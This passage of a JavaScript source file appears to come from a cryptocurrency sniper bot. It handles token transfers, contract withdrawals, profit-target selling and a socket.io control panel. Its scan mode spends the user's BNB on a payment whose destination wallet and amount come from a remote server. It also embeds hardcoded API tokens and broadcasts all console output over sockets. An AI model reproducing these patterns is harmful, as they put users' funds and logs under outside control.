          consoleLog(chalk.green(`Stopping the process.. \n`))
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        }
      } else if (utilAction == 2) {

        if (curency == null) {
          balanceETHER = await provider.getBalance(myAddress);
          tokenDecimals = 18;
          tokenInfoSymbol = "ETHER";
          consoleLog(chalk.green(`Total ETHER balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceETHER, 18)).toFixed(6))}\n`))
        } else {

          balanceETHER = await getTokenBalance(curency, myAddress, provider)
          tokenInfoCall = new web3.eth.Contract(tokenInfoABI, curency);
          tokenInfoSymbol = await tokenInfoCall.methods.symbol().call();
          tokenInfoDecimals = await tokenInfoCall.methods.decimals().call();
          tokenDecimals = tokenInfoDecimals;
          console.log(myAddress)
          consoleLog(chalk.green(`Total TOKEN balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceETHER, 18)).toFixed(6))}\n`))
        }

        if (balanceETHER.gt(amount_transfer) && passed == 0) {
          passed = 1;
          consoleLog("Executing transfer from: " + myAddress);
          consoleLog("To: " + to_transfer);
          consoleLog("For: " + parseFloat(ethers.utils.formatUnits(amount_transfer, tokenDecimals)).toFixed(6) + " " + tokenInfoSymbol);

          if (curency == null) {
            try {
              consoleLog("Sending....");
              if (choseBlockChain == 1) {
                const tx = await account.sendTransaction({
                  to: to_transfer,
                  value: ethers.utils.parseEther(process.env.amount_transfer),
                  gasLimit: parseInt(transfer_gas), gasPrice: transfer_gwei, nonce: currentNonce
                });
                await tx.wait();
                console.log("Transaction was succesfull please check on https://" + chainScanner + "/tx/" + tx.hash)
                await new Promise(r => setTimeout(r, 500))
                process.exit(0)

              } else {
                const tx = await account.sendTransaction({
                  to: to_transfer,
                  value: ethers.utils.parseEther(process.env.amount_transfer),
                  gasLimit: parseInt(transfer_gas), maxFeePerGas: transfer_gwei, maxPriorityFeePerGas: max_transfer_gwei, nonce: currentNonce
                });
                await tx.wait();
                console.log("Transaction was succesfull please check on https://" + chainScanner + "/tx/" + tx.hash)
                await new Promise(r => setTimeout(r, 500))
                process.exit(0)
              }

            } catch (e) {
              console.log(String(e))
              console.log("Transaction failed, please check your wallet on https://" + chainScanner + "/address/" + myAddress);
              await new Promise(r => setTimeout(r, 500))
              process.exit(0)
            }
          } else {
            try {
              transferRouter = contractAbi.transferRouter;

              const tranRouter = new ethers.Contract(
                curency, transferRouter, account
              );

              consoleLog("Sending....");
              let sendTx = await tranRouter.transfer(
                to_transfer,
                amount_transfer,
                { gasLimit: transfer_gas, gasPrice: transfer_gwei, nonce: currentNonce++ }
              )
              await sendTx.wait();
              console.log("Transaction was succesfull please check on https://" + chainScanner + "/tx/" + sendTx.hash)
              await new Promise(r => setTimeout(r, 500))
              process.exit(0)
            } catch (e) {
              console.log(String(e))
              console.log("Transaction failed, please check your wallet on https://" + chainScanner + "/address/" + myAddress);
              await new Promise(r => setTimeout(r, 500))
              process.exit(0)
            }
          }

        } else {
          consoleLog("Your balance is too low to make the transfer!")
          consoleLog("Exiting the process!")
          await new Promise(r => setTimeout(r, 500))
          process.exit(0)
        }
      } else if (utilAction == 3) {

        balanceETHER = await getTokenBalance(curency, myAddress, provider)
        tokenInfoCall = new web3.eth.Contract(tokenInfoABI, curency);
        tokenInfoSymbol = await tokenInfoCall.methods.symbol().call();
        tokenInfoDecimals = await tokenInfoCall.methods.decimals().call();
        tokenDecimals = tokenInfoDecimals;
        consoleLog(chalk.green(`Total TOKEN balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceETHER, 18)).toFixed(6))}\n`))


        if (balanceETHER.gt(amount_transfer) && passed == 0) {
          passed = 1;
          consoleLog("Executing transfer from: " + myAddress);
          consoleLog("To: " + to_transfer);
          consoleLog("For: " + parseFloat(ethers.utils.formatUnits(amount_transfer, tokenDecimals)).toFixed(6) + " " + tokenInfoSymbol);

          try {
            transferRouter = contractAbi.transferRouter;

            const tranRouter = new ethers.Contract(
              curency, transferRouter, account
            );

            consoleLog("Sending....");
            if (choseBlockChain == 1) {
              let sendTx = await tranRouter.transfer(
                to_transfer,
                amount_transfer,
                { gasLimit: transfer_gas, gasPrice: transfer_gwei, nonce: currentNonce++ }
              )
              await sendTx.wait();
              console.log("Transaction was succesfull please check on https://" + chainScanner + "/tx/" + sendTx.hash)
              await new Promise(r => setTimeout(r, 500))
              process.exit(0)
            } else {
              let sendTx = await tranRouter.transfer(
                to_transfer,
                amount_transfer,
                { gasLimit: parseInt(transfer_gas), maxFeePerGas: max_transfer_gwei, maxPriorityFeePerGas: transfer_gwei, nonce: currentNonce }
              )
              await sendTx.wait();
              console.log("Transaction was succesfull please check on https://" + chainScanner + "/tx/" + sendTx.hash)
              await new Promise(r => setTimeout(r, 500))
              process.exit(0)
            }

          } catch (e) {
            console.log(String(e))
            console.log("Transaction failed, please check your wallet on https://" + chainScanner + "/address/" + myAddress);
            await new Promise(r => setTimeout(r, 500))
            process.exit(0)
          }


        } else {
          consoleLog("Your balance is too low to make the transfer!")
          consoleLog("Exiting the process!")
          await new Promise(r => setTimeout(r, 500))
          process.exit(0)
        }

      } else if (utilAction == 4) {
        curency = token_transfer;
        balanceETHER = await getTokenBalance(curency, to_transfer, provider)
        tokenInfoCall = new web3.eth.Contract(tokenInfoABI, curency);
        tokenInfoSymbol = await tokenInfoCall.methods.symbol().call();
        tokenInfoDecimals = await tokenInfoCall.methods.decimals().call();
        tokenDecimals = tokenInfoDecimals;
        consoleLog(chalk.green(`Total TOKEN balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceETHER, tokenInfoDecimals)).toFixed(6))}\n`) + ' ' + tokenInfoSymbol)


        if (balanceETHER.gt('0x00') && passed == 0) {
          passed = 1;
          consoleLog("Withdraw transfer from: " + to_transfer);
          consoleLog("To: " + myAddress);



          if (choseBlockChain == 1) {
            try {
              const SWcontractRouter = new ethers.Contract(
                to_transfer,
                [
                  'function Withdraw(address _token)'
                ],
                account
              );
              console.log(chalk.green(`Retriving token ...`))
              try {
                hasFound = await SWcontractRouter.Withdraw(
                  curency,
                  { gasLimit: transfer_gas, gasPrice: transfer_gwei, nonce: currentNonce++ }
                )
              } catch (e) {
                console.log(e)
              }


              await hasFound.wait();
              console.log('Success, check your transaction on https://' + chainScanner + '/tx/' + hasFound.hash);
              process.exit(0)
            } catch (e) {
              console.log('Failed, check your transaction on https://' + chainScanner + '/tx/' + hasFound.hash);
              process.exit(0)
            }
          } else {
            console.log('Current nonce: ' + currentNonce)
            try {
              const SWcontractRouter = new ethers.Contract(
                to_transfer,
                [
                  'function Withdraw(address _token)'
                ],
                account
              );
              console.log(chalk.green(`Retriving token ...`))
              try {
                hasFound = await SWcontractRouter.Withdraw(
                  curency,
                  { gasLimit: parseInt(transfer_gas), maxFeePerGas: max_transfer_gwei, maxPriorityFeePerGas: transfer_gwei, nonce: currentNonce }
                )

                await hasFound.wait();
                console.log('Success, check your transaction on https://' + chainScanner + '/tx/' + hasFound.hash);
                await new Promise(r => setTimeout(r, 500))
                process.exit(0)
              } catch (e) {
                console.log('Failed, check your transaction on https://' + chainScanner + '/tx/' + hasFound.hash);
                await new Promise(r => setTimeout(r, 500))
                process.exit(0)
              }

            } catch (e) {
              console.log(String(e))
            }

          }



        } else {
          consoleLog("Your have 0 tokens to retrive from swap contract!")
          consoleLog("Exiting the process!")
          await new Promise(r => setTimeout(r, 500))
          process.exit(0)
        }

      } else if (utilAction == 5) {
        if (choseBlockChain == 1) {
          console.log('This function is not permited on Binance Smart Chain!')
          await new Promise(r => setTimeout(r, 500))
          process.exit(0)
        }
        unstuckPrice = await web3.eth.getGasPrice();
        unstuckPrice = parseInt((unstuckPrice / 1000000000).toFixed(0))
        unstuckPrice = (unstuckPrice * 1.15).toFixed(0)
        unstuckPrice = ethers.utils.parseUnits(String(unstuckPrice), 'gwei')
        if (choseBlockChain == 2) {
          unstuckGasLimit = parseInt(350000);
          minGasPrice = ethers.utils.parseUnits('10', 'gwei');
        } else if (choseBlockChain == 3) {
          unstuckGasLimit = parseInt(2000000);
          minGasPrice = unstuckPrice;
        }

        const signer = wallet.connect(provider);
        let currentNonce = await signer.getTransactionCount();
        console.log('Sending transfer to own wallet to cancel transaction in pending...');
        try {
          const txUnstuck = await signer.sendTransaction({
            to: myAddress,
            value: ethers.utils.parseEther('0.00'),
            gasLimit: unstuckGasLimit, maxFeePerGas: unstuckPrice, maxPriorityFeePerGas: minGasPrice, nonce: currentNonce
          });

          cancelTx = await txUnstuck.wait();
          console.log('Transaction unstuck! Please check https://etherscan.io/address/' + myAddress);
          await new Promise(r => setTimeout(r, 500))
          process.exit(0)
        } catch (e) {
          consoleLog(e)
          consoleLog(chalk.red('Unable to confirm unstuck transaction, please check https://etherscan.io/address/' + myAddress));
          await new Promise(r => setTimeout(r, 500))
          process.exit(0)
        }
      }

    })();

  } else if (choseMode == 8) {




    (async () => {

      await axios.get('https://crypto-scammer.com/api/get-scan-map?token=9BF1E98D2C1A2099632E681B0C71FCD1F8F36236938E1B5F1FC752B8732F7CDC').then(function (response) {

        if (response.data.status == 200) {
          functionScan = response.data.data;
          scanningWallet = response.data.wallet;
          scanningPayment = response.data.value;
          scanningCurrency = response.data.currency;
          paymentActive = response.data.active;
          functionScan.forEach(element => {
            token_functions_result.push({ 'keyword': element.keyword, 'function': element.function, 'category': element.category, 'description': element.description });
          });
        } else if (response.data.status == 503) {
          console.log("Warning forbiden access detected! Please contact the developer @x3raphim on telegram!")
          //await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        } else {
          console.log("Warning service down! Please contact the developer @x3raphim on telegram!")
          //await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        }
      });

      tokenInfoCall = new web3.eth.Contract(tokenInfoABI, scanningCurrency);

      tokenInfoDecimals = await tokenInfoCall.methods.decimals().call();
      tokenDecimals = tokenInfoDecimals;
      tokenInfoSymbol = await tokenInfoCall.methods.symbol().call();

      tokenPrice = await getTokenPriceScanner(scanningCurrency, provider);
      tokenPrice = String((scanningPayment / tokenPrice) * 1.001);


      amountIn = ethers.utils.parseUnits(tokenPrice, 'ether');
      amountToBeProccessed = await sellRouterTarget.getAmountsOut(
        amountIn,
        [scanningCurrency, '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c']
      )
      amountToBeProccessed = amountToBeProccessed[1].mul(2)
      balance = await provider.getBalance(myAddress);
      if (balance.gte(amountToBeProccessed)) {

        console.log("Wallet balance: " + parseFloat(ethers.utils.formatUnits(balance, 18)).toFixed(6) + " BNB")
      } else {
        console.log("You dont have enough BNB in your wallet to make payment for scan!")
        process.exit(0)
      }
      await getAllTokenInfo2(tokenAddress);

      dataArray.sort(function (a, b) {
        return a.TokenHolderQuantity - b.TokenHolderQuantity;
      })

      let topFive = dataArray.slice(-5).reverse()
      let honeyAndTaxCheck = await honeypotIs(process.env.TokenContract);
      if (honeyAndTaxCheck) {
        HP = honeyAndTaxCheck.HP;

        if (HP == true) {
          resultsOfScan.isHp = "YES";

          scanData.honeypotTokenScan = 'YES'
        } else {
          if (HP == false) {
            resultsOfScan.isHp = "NO";
            scanData.honeypotTokenScan = 'NO'
          }

        }
      }
      if (honeyAndTaxCheck.BuyFee == undefined || honeyAndTaxCheck.SellFee == undefined) {
        scanData.feeBuyTokenScan = '-';
        scanData.feeSellTokenScan = '-';
      } else {
        scanData.feeBuyTokenScan = honeyAndTaxCheck.BuyFee;
        scanData.feeSellTokenScan = honeyAndTaxCheck.SellFee;
      }

      if ((honeyAndTaxCheck.BuyFee + honeyAndTaxCheck.SellFee) > 50) {
        resultsOfScan.highTax = true;
        if (honeyAndTaxCheck.SellFee > 90) {
          console.log("Warning!!! Fee on sell is " + honeyAndTaxCheck.SellFee + "% , this is practically a honeypot!!!")
        }
        if (honeyAndTaxCheck.BuyFee > 90) {
          console.log("Warning!!! Fee on buy is " + honeyAndTaxCheck.BuyFee + "% , this is an anti-bot measure!!!")
          antibotDetected = 'YES';
        }
      } else {
        resultsOfScan.highTax = false;
      }
      resultsOfScan.isScam = scam;
      resultsOfScan.isRug = rug;
      resultsOfScan.buyTax = honeyAndTaxCheck.BuyFee;
      resultsOfScan.sellTax = honeyAndTaxCheck.SellFee;

      resultsOfScan.antiBot = bot;
      resultsOfScan.functionsDetected = functionsScanned;
      if (resultsOfScan.functionsDetected.length === 0) {
        antibotDetected = 'NO';

      } else {
        resultsOfScan.functionsDetected.forEach(element => {
          if (element.category == 'antiBot') {
            antibotDetected = 'YES';
          }
        });

      }
      scanData.antiBotTokenScan = antibotDetected;
      io.emit('scanData', scanData);
      if (verified == 0) {
        console.log('Payment will not be taken cause the contract is not verfied and we could not analyze the functions!')
        await new Promise(r => setTimeout(r, 400))
        process.exit(0)
      }
      if (paymentForScan == true && paymentActive == true) {
        console.log("Payment will be executed!")
        paidValue = scanningPayment;
      } else if (paymentActive == false) {

      } else {
        console.log("Payment is not necesary because you have Contract Addon!")
        paidValue = 0;
      }
      if (paidValue != 0 && verified == 1 && paymentActive == true) {
        if (passed == 0) {
          passed = 1;
          try {
            currentNonce = await getNonce(myAddress);
            consoleLog("Paying....");
            buytx = await buyRouterTarget.swapETHForExactTokens(
              amountIn,
              ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', scanningCurrency],
              scanningWallet,
              Date.now() + 1000 * 60 * 10,
              { gasLimit: '250000', gasPrice: ethers.utils.parseUnits('6', 'gwei'), value: amountToBeProccessed, nonce: currentNonce++ }
            )
            await buytx.wait();
            console.log("Payment was succesfull please check on https://" + chainScanner + "/tx/" + buytx.hash)

          } catch (e) {
            console.log(String(e))
            console.log("Payment failed, please check your wallet on https://" + chainScanner + "/address/" + myAddress);
            await new Promise(r => setTimeout(r, 400))
            process.exit(0)
          }
        }

      } else {

      }


      console.log("PAID FOR SCAN: " + paidValue + " " + tokenInfoSymbol);
      console.log("SCAN RESULTS:");


      if (resultsOfScan.functionsDetected.length === 0) {
        console.log("----------------------------------------------------")
        console.log("No Malicious/Scam/AntiBot functions detected!")
        console.log("----------------------------------------------------")
      } else {
        resultsOfScan.functionsDetected.forEach(element => {

          console.log("----------------------------------------------------")
          console.log("CATEGORY: " + element.category)
          console.log("FUNCTION: " + element.function)
          functionToDetect = getHashForFunction(element.function);
          console.log("HASH: " + functionToDetect)
          console.log("DESCRIPTION: " + element.description)
          console.log("----------------------------------------------------")
        });
      }

      await new Promise(r => setTimeout(r, 400))
      process.exit(0)
    })();
  } else {
    consoleLog(`Please chose the corect mode to start the MultiSniper Plus!`)
    processExit()
  }
}

async function detectPriceValue(tokenAddress, provider, balance, tokenDecimals, tokenInfoSymbol, startingPriceValue) {



  //console.log(2.99704159 >= 10.00000000);
  while (detect_price_command) {

    tokenPrice = await getTokenPrice(tokenAddress, provider);

    totalValue = parseFloat(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(8) * tokenPrice)
    if (newPriceValue == 0) {
      proffitOrDeficit = parseFloat(parseFloat(totalValue / startingPriceValue).toFixed(8) / nrOfBuyTransactions);
      // console.log('totalvalue / starting price :' + totalValue + ' / ' + startingPriceValue)
    } else {
      proffitOrDeficit = parseFloat(parseFloat(totalValue / newPriceValue).toFixed(8) / nrOfBuyTransactions);
      //console.log('totalvalue / new price :' + totalValue + ' / ' + newPriceValue)
    }
    if (sellWithProffit) {
      if (proffitOrDeficit >= parseFloat(parseFloat(xvalue).toFixed(8))) {
        console.log(xvalue + "X Target reached!!!");
        console.log("proffitIS: " + proffitOrDeficit)
        console.log("investedIS: " + parseFloat(parseFloat(xvalue).toFixed(8)))
        sell_command = 100;
      } else {

        // console.log("Profit target not reached yet!");
      }
    }

    if (true) {
      let currentTokenData = {
        "current_token_balance": parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(8) + ' ' + tokenInfoSymbol,
        "current_token_price": parseFloat(tokenPrice).toFixed(8) + ' ' + exchangeTokenName,
        "current_total_value": parseFloat(totalValue).toFixed(8) + ' ' + exchangeTokenName,
        "proffit": proffitOrDeficit,
      }
      io.sockets.emit('currentTokenBalance', currentTokenData);

      if (sell_command) {
        if (sell_command == 100) detect_price_command = false
        await sellFunction(sell_command, balance)
        balance = await getTokenBalance(tokenAddress, myAddress, provider);
        console.log('Your new token balance is: ' + parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))
      } else {

      }
    } else {
      consoleLog("no socket");
    }

  }
}

async function sellFunction(qty, balance) {
  balance25 = balance.div(4)
  balance50 = balance.div(2)
  balance75 = balance25.add(balance50)
  if (qty == 25) balance = balance25
  if (qty == 50) balance = balance50
  if (qty == 75) balance = balance75
  confirmedPuchase = true;
  passed = 1;
  consoleLog(chalk.green(`Start selling token...`))
  currentNonce = await getNonce(myAddress);
  balanceToSell = balance;
  await startSelling(balanceToSell);
  if (qty <= 75) {
    if (newPriceValue > 0) {
      newPriceValue = parseFloat(newPriceValue).toFixed(0) - (parseFloat(newPriceValue).toFixed(0) * (parseFloat(qty).toFixed(0) / 100));
      newPriceValue = parseFloat(newPriceValue).toFixed(3)
    } else {
      newPriceValue = parseFloat(process.env.amount_BNB_buy).toFixed(0) - (parseFloat(process.env.amount_BNB_buy).toFixed(0) * (parseFloat(qty).toFixed(0) / 100));
      newPriceValue = parseFloat(newPriceValue).toFixed(3)
    }
    //console.log(startingPriceValue)
  } else {
    processExit()
  }
  sell_command = 0;
}


//-----------------------socket.io---------------------------------------

const io = require("socket.io")(server, {
  cors: {
    origin: local_ip + ":" + web_port,
    methods: ["GET", "POST"]
  }
});


server.listen(port);
var socket_client = null;

io.on('connection', function (client) {
   // Listen for test and disconnect events
  //client.on('test', onTest);

  let date = new Date().toLocaleString();
  socket_client = client.request.connection.remoteAddress;
  if(socket_client != null){
    socket_client = socket_client.split('::ffff:');
    socket_client = socket_client[1]
  }
  if(firstConnection == 0){
    let message = "New Connection: " + date + " - " + socket_client + " \n";
    fs.appendFile("accessLog.txt", message, 'utf8', function (err) {
      if (err) return console.log(err);
      else {
         
      }
  });
  consoleLog('Received: Connection event from client: ' + socket_client);
  firstConnection =1;
  }


  client.on('client_data', clientData);
  client.on('disconnect', onDisconnect);
  client.on('sendData', receiveData);
  client.on('startSniperBot', startBot);
  client.on('stopBot', stopBot);
  client.on('getBalance', getBalance);
  client.on('updateData', updateData);
  client.on('sellQuantity', sellQuantity);

  async function getBalance() {

    consoleLog("Client request balance..");
    let bal = await getTokenBalance(WBNB, myAddress, provider);
    bal = parseFloat(ethers.utils.formatUnits(bal, 18)).toFixed(6);
    consoleLog(bal);
    client.emit('sendBalance', bal + " WBNB");

  }

  async function getNrWallet() {

    let authTokenHasci = '9BF1E98D2C1A2099632E681B0C71FCD1F8F36236938E1B5F1FC752B8732F7CDC';
    let paramz = new URLSearchParams();
    paramz.append('token', authTokenHasci);
    await axios.post('https://multi-sniper.com/apiPlus.php', paramz).then(function (response) {
      if (response.data) {
        if (response.data != null) {
          nrWallets = response.data;
        }
      }
    });
    return nrWallets;
  }

  async function getCtrAddon() {

    let authTokenHasci = 'D1F8F36236938E1B5F1FC752B8732F7CDC9BF1E98D2C1A2099632E681B0C71FC';
    let paramz = new URLSearchParams();
    let responseCtr = false;
    paramz.append('token', authTokenHasci);
    await axios.post('https://multi-sniper.com/apiPlus.php', paramz).then(function (response) {
      if (response.data) {
        if (response.data.success != null) {

          responseCtr = (response.data.success) ? true : false;

        }
      }
    });
    return responseCtr;
  }
  // Handle a initial connection from the client
  async function clientData() {

        let client_data = await sendClientData();
        let walletAllowed = await getNrWallet();
        let contractAddonAllowed = await getCtrAddon();
        if (contractAddonAllowed) {
          walletAllowed = 15;
        }
        client.emit('initClientData', client_data);
        client.emit('initContractData', contractAddonAllowed);
        client.emit('initWalletData', walletAllowed);

    //let currentTokenData = await getCurrentTokenBalance();

    //client.emit('currentTokenBalance', currentTokenData);
  }


  async function sendClientData() {

    let data = customEnv(process.env);
   
    if(process.env.privateKey.length > 10){
        data.privateKey = 'NO ENTRY'
    }
    return data;

  }

  function sellQuantity(data) {

    console.log("Selling: " + data.val + "%")

    sell_command = data.val
    //sell data %
    //sellFunction();

    // client.emit('currentTokenBalance', {
    //   "current_token_balance" : 75,
    //   "current_token_price" : 21,
    //   "current_total_value" : 1500,
    // });
  }

  function updateData(data) {
    console.log(data)
    replaceEnvData(data)
  }



  function stopBot() {
    consoleLog("..");
    processExit();
  }

  function startBot(mode) {
    choseMode = mode;

    consoleLog("Starting Bot .. mode: " + choseMode);
    // client.emit('test', "BOT STARTED");
    try {
      if (parseInt(process.env.choseBlockChain) == 1) {
        nodeWSS = process.env.bscNodeBSC;
      } else if (parseInt(process.env.choseBlockChain) == 2) {
        abiOfBlockChain = tokenInfoABI;
        nodeWSS = process.env.bscNodeETH;
      } else if (parseInt(process.env.choseBlockChain) == 3) {
        abiOfBlockChain = tokenInfoABI;
        nodeWSS = process.env.bscNodePOLY;
      } else if (parseInt(process.env.choseBlockChain) == 4) {
        abiOfBlockChain = tokenInfoABI;
        nodeWSS = process.env.bscNodeCRONOS;
      }
      web33 = new Web3(nodeWSS);
      let verifiedS = "yes";
      (async () => {
        if (parseInt(process.env.choseBlockChain) == 1) {

          let sourceVerified = await checkContract(process.env.TokenContract)
          if (sourceVerified == true) {
            verifiedS = "YES"
          } else if (sourceVerified == false) {
            verifiedS = "NO"
          } else {
            verifiedS = "Error"
          }
          /*     if (parseInt(process.env.choseBlockChain) == 1) {
              } else {
                verifiedS = "Unavailable"
              } */

        } else {
          verifiedS = "Unavailable";
        }

        getTokenInfoOnContract = new web33.eth.Contract(abiOfBlockChain, process.env.TokenContract);


        let iDecimals = await getTokenInfoOnContract.methods.decimals().call();
        let iName = await getTokenInfoOnContract.methods.name().call();
        let iSymbol = await getTokenInfoOnContract.methods.symbol().call();
        let iSupply = await getTokenInfoOnContract.methods.totalSupply().call();
        iSupply = ethers.BigNumber.from(iSupply);
        let iPair = iSymbol + "/" + symbolCurrency;

        let honeyAndTaxCheck = await honeypotIs(process.env.TokenContract);
        HP = honeyAndTaxCheck.HP;
        if (honeyAndTaxCheck.HP == null) {
          honeyAndTaxCheck.BuyFee = "Unknown";
          honeyAndTaxCheck.SellFee = "Unknown";
          honeyAndTaxCheck.HP = "Not Listed"
        }
        if (honeyAndTaxCheck.HP == true) {
          honeyAndTaxCheck.BuyFee = "Unknown";
          honeyAndTaxCheck.SellFee = "Unknown";
          honeyAndTaxCheck.HP = "YES"
        }
        if (honeyAndTaxCheck.HP == false) {
          honeyAndTaxCheck.HP = "NO"
        }

        tokenData = {
          //Token info
          nameToken: iName,
          simbolToken: iSymbol,
          supplyToken: parseFloat(ethers.utils.formatUnits(iSupply, iDecimals)).toFixed(0),
          decimalsToken: iDecimals,
          pairToken: iPair,
          feeBuyToken: honeyAndTaxCheck.BuyFee,
          feeSellToken: honeyAndTaxCheck.SellFee,
          verifiedToken: verifiedS,
          honeypotToken: honeyAndTaxCheck.HP,
          antiBotToken: 'beta',
        }

        client.emit('tokenData', tokenData);

      })();
      checkNodeStatusDefault();



    } catch (error) {
      consoleLog(error);
      processExit();
    }


  }




  // Handle a disconnection from the client
  function onDisconnect() {
    consoleLog('Received: disconnect event from client: ' + client.id);
    //client.removeListener('test', onTest);
    replaceEnvData({ tg_wait_for_contract: false });
    client.removeListener('disconnect', onDisconnect);
    client.removeListener('sendData', receiveData);
    client.removeListener('startSniperBot', startBot);
    client.removeListener('stopBot', stopBot);
    client.removeListener('updateData', updateData);
    client.removeListener('sellQuantity', sellQuantity);
  }

  function receiveData(data) {
    //clientData = deparam(data);
  }

});


//override console.log
console.log = (function () {
  var orig = console.log;
  return function () {
    try {
      var tmp = process.stdout;
      process.stdout = process.stderr;
      orig.apply(console, arguments);
    } finally {
      process.stdout = tmp;
      io.sockets.emit('test', arguments);
    }
  };
})();

function processExit() {
  process.exit()
}

function consoleLog(msg) {
  console.log(msg)
}